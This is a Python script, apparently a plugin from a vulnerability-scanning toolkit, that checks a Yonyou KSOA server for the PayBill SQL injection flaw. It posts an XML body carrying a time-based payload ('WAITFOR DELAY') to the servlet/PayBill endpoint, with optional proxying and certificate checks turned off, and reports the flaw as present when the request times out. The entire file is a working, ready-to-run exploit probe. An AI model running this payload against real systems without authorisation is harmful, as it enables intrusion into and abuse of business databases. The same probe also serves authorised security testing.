import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'}
        data="""<?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '0:0:10'--</name><name>1</name><name>102360</name></root>"""
        try:
            logging.captureWarnings(True)
            gf = requests.post(url + "servlet/PayBill?caculate&_rnd=", data=data, cookies=s_cookie, headers=headers,proxies=proxies, verify=False,timeout=5)
            gf.encoding = 'utf-8'
            uia = '[-]漏洞不存在'
        except requests.exceptions.ReadTimeout:
            uia = "[+]漏洞存在\n"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 用友时空KSOA PayBill SQL注入漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)